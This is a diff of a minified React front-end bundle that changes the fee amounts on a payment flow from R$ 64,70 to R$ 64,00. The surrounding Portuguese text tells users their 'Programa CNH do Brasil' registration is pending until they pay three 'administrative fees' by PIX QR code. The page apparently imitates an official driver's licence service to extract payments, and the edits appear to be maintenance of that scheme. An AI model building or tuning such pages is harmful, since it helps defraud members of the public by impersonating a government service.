@@ -21611,7 +21611,7 @@ function DE() {
                 children: "Valor:"
               }), l.jsx("span", {
                 className: "font-bold text-green-600",
-                children: "R$ 64,70"
+                children: "R$ 64,00"
               })]
             }), l.jsxs("div", {
               className: "flex justify-between items-center",
@@ -21676,7 +21676,7 @@ function DE() {
             className: "text-center mb-6",
             children: [l.jsxs("p", {
               className: "text-3xl font-bold text-green-600",
-              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "64,70"]
+              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "64,00"]
             }), l.jsx("p", {
               className: "text-gray-600",
               children: "Valor a ser pago"
@@ -21741,7 +21741,7 @@ function DE() {
               }), l.jsx("li", {
                 children: "3. Escaneie o QR Code ou cole o código PIX"
               }), l.jsx("li", {
-                children: "4. Confirme o pagamento de R$ 64,70"
+                children: "4. Confirme o pagamento de R$ 64,00"
               })]
             })]
           }), l.jsxs("div", {
@@ -22301,11 +22301,11 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
     }, xw = async () => {
       tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-• Taxa de Expedição de Documento (TED): R$ 17,75
-• Taxa de Serviços Administrativos (TSA): R$ 21,70
-• Taxa de Processamento Eletrônico (TPE): R$ 25,25
+• Taxa de Expedição de Documento (TED): R$ 17,00
+• Taxa de Serviços Administrativos (TSA): R$ 21,50
+• Taxa de Processamento Eletrônico (TPE): R$ 25,50
 
-Valor Total: R$ 64,70`, 3e3), i("finalize_button")
+Valor Total: R$ 64,00`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22328,7 +22328,7 @@ Valor Total: R$ 64,70`, 3e3), i("finalize_button")
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 64,70, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 64,00, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
     };
   x.useEffect(() => {
     f && y && fw()
@@ -23083,7 +23083,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,70, clique no botão 
                       children: "VALOR A PAGAR EM REAIS"
                     }), l.jsx("p", {
                       className: "font-bold text-lg",
-                      children: "R$ 64,70"
+                      children: "R$ 64,00"
                     })]
                   })]
                 }), o === "awaiting_payment" && l.jsx("div", {
@@ -23438,7 +23438,7 @@ function VE() {
                   children: "TED"
                 }), l.jsx("p", {
                   className: "font-semibold",
-                  children: "R$ 17,75"
+                  children: "R$ 17,00"
                 })]
               }), l.jsxs("div", {
                 children: [l.jsx("p", {
@@ -23446,7 +23446,7 @@ function VE() {
                   children: "TSA"
                 }), l.jsx("p", {
                   className: "font-semibold",
-                  children: "R$ 21,70"
+                  children: "R$ 21,50"
                 })]
               }), l.jsxs("div", {
                 children: [l.jsx("p", {
@@ -23454,7 +23454,7 @@ function VE() {
                   children: "TPE"
                 }), l.jsx("p", {
                   className: "font-semibold",
-                  children: "R$ 25,25"
+                  children: "R$ 25,50"
                 })]
               })]
             })
